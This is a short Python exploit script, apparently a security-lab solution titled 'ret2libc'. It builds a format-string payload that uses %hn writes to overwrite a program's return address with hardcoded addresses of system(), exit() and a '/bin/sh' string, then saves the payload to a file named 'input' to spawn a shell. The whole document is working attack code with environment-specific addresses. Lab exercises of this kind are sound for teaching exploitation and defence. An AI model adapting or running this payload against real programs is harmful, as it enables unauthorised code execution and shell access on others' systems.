#!/usr/bin/python3
# task2_2: ret2libc
import sys

# ebp(frame pointer)+4 = return address
addr = 0xffffced8 + 4
payload  = (addr + 10).to_bytes(4,byteorder='little')  # high 2 bytes of /bin/sh string address
payload += ("abcd").encode('latin-1')           
payload += (addr + 8).to_bytes(4,byteorder='little')  # low 2 bytes of /bin/sh string address
payload += ("abcd").encode('latin-1')
payload += (addr + 6).to_bytes(4,byteorder='little')  # high 2 bytes of exit address
payload += ("abcd").encode('latin-1')
payload += (addr + 4).to_bytes(4,byteorder='little')  # low 2 bytes of exit address
payload += ("abcd").encode('latin-1')
payload += (addr + 2).to_bytes(4,byteorder='little')  # high 2 bytes of system address
payload += ("abcd").encode('latin-1')
payload += (addr).to_bytes(4,byteorder='little')      # low 2 bytes of system address

# system address : 0x0004c800 + 0xf7c00000 = 0xf7c4c800
# exit address   : 0x0003bc90 + 0xf7c00000 = 0xf7c3bc90
# /bin/sh address: 0x001b5faa + 0xf7c00000 = 0xf7db5faa

# Construct the format string
offset1 = 0xf7db  - len(payload) - 15*8
offset2 = 0x15faa - 0xf7db
offset3 = 0x1f7c3 - 0x15faa
offset4 = 0x2bc90 - 0x1f7c3
offset5 = 0x2f7c4 - 0x2bc90
offset6 = 0x3c800 - 0x2f7c4
payload += ("%.8x" * 15 +
    "%.{}x".format(offset1) + "%hn" +
    "%.{}x".format(offset2) + "%hn" +
    "%.{}x".format(offset3) + "%hn" +
    "%.{}x".format(offset4) + "%hn" +
    "%.{}x".format(offset5) + "%hn" +
    "%.{}x".format(offset6) + "%hn").encode('latin-1')
# Write the payload to input
with open("input", "wb") as f:
    f.write(payload)